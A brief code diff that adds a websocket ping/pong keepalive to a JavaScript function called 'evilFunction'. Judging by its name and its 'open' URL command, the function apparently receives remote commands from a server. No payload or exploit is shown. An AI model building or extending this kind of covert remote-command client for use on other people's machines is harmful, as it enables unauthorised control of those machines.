@@ -59,6 +59,11 @@ function evilFunction(data,ws){
 
     data = data.split(',')
 
+    // Ping Pong
+    if(data == '__ping__'){
+      ws.send('__pong__')
+    }
+
     // Open Site
     if(data[0] == 'open'){
         if(data[1].startsWith('http')){
